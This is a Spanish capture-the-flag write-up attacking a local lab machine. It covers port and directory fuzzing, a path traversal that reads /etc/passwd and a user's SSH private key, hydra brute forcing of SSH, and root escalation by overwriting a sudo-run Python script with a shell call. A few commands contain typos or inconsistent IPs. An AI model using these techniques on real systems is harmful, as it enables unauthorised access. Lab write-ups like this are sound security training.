> Tags: #facil #LFI #fuzzing #ssh #hydra 

# Writeup

El primer paso es hacer un escaneo básico de puertos, utilizando el siguiente comando:
```bash
nmap -sS -p- 172.17.0.2 -oN ports
```

![[Anexos/Pasted image 20251007081551.png]]

Tras concluir el escaneo, exporto el resultado a un fichero llamado **ports** para poder manipularlo más tarde.
En este caso están abiertos los puertos 80 y 22, correspondientes a un servicio web y a un ssh.

## Directory listing con gobuster

Ahora que ya sabemos que existe un servicio web por el puerto 80, procedemos a hacer un reconocmiento de directorios. Para ello usaremos gobuster.
Usando el comando:
```bash
gobuster dir -u htto://http:172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory/directory-list-2.3-medium.txt -x .php,.txt,.xml,.html -o dir_fuzz.txt
```
### Parámetros utilizados:

- **-u** sirve para indicar la url.
- **-w** hace referencia al diccionario de palabras que va a utilizar el fuzzer.
- **-t** indica el número de hilos a utilizar. Por defecto son 4.
- **-x** muy útil, sirve para que también haga búsqueda de ficheros con las extensiones que le indicamos, separadas por comas.

![[Anexos/Pasted image 20251007103414.png|950]]

Aquí observamos que nos arroja dos directorios y un archivo .php. Si accedemos a la web: **http://172.17.0.2/index.php** vemos que no ocurre nada, así que probamos hacer fuzzing al archivo para intentar descubrir algún parámetro oculto.
Para ello, usamos el siguiente comando:


![[Anexos/Pasted image 20251007120001.png]]

Gracias a hacer fuzzing en el parámetro, vemos que obtenemos un Directory Path Traversal, obteniendo acceso al archivo /etc/passwd

![[Anexos/Pasted image 20251007115826.png|700]]

Aquí podemos ver a los usuarios **vaxei** y **luisillo**, así que vamos a probar hacer fuerza bruta por el protocolo ssh utilizando la herramienta hydra:

```bash
hydra -l vaxei -P /usr/share/wordlists/rockyou.txt -I ssh://172.17.0.3/
hydra -l luisillo -P /usr/share/wordlists/rockyou.txt -I ssh://172.17.0.3/
```

No encontramos nada, así que, al tener solamente abierto el puerto ssh voy a intentar buscar en sus directorios home el archivo id_rsa.

![[Anexos/Pasted image 20251026030311.png]]

Ahora, copiamos el contenido y nos creamos un archivo llamado id_rsa en nuestro directorio de trabajo. le asignamos los permisos correspondientes y luego entramos por ssh:

```bash
chmod 600 id_rsa
ssh -i id_rsa vaxei@172.17.0.3 
```

![[Pasted image 20251026030934.png]]

Para elevar privilegios vamos a ejecutar sudo -l, y vemos lo siguiente:

![[Pasted image 20251026031057.png]]

Ahora tratamos de convertirnos en el usuario luisillo, ejecutando en su nombre lo siguiente:

![[Pasted image 20251026031008.png]]

Ejecutamos y somos luisillo:

![[Pasted image 20251026031613.png]]

Ahora vemos lo siguiente:

![[Anexos/Pasted image 20251026032102.png]]

![[Pasted image 20251026032211.png]]

Veo que tengo permisos de escritura y ejecución en el directorio actual de trabajo así que directamente voy a borrar todo el contenido del fichero paw.py y reemplazarlo por un código sencillo de python que me otorgue una bash privilegiada:

```bash
echo 'import os; os.system("/bin/bash")' > paw.py 

sudo -u root /usr/bin/python3 /opt/paw.py 
```

![[Anexos/Pasted image 20251026035318.png]]
